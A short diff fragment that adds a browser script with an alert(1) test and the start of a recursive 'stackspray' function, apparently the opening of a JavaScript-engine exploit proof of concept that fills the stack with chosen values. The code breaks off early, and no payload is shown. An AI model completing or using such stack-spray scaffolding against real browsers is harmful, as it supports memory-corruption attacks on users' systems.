@@ -1,4 +1,15 @@
+<script>
 
+alert(1);
+
+OFFSET_SIZE = 400;
+
+// Fill the stack with the return value of the provided function.
+function stackspray(f, x, d) {
+  if(d==0) return;
+  // This function will spill all the local variables to the stack
+  // since they are needed for the returned array.
+  let v0 = f*x;
   let v1 = f*x*x;
   let v2 = f*x*x*x;
   let v3 = f*x*x*x*x;
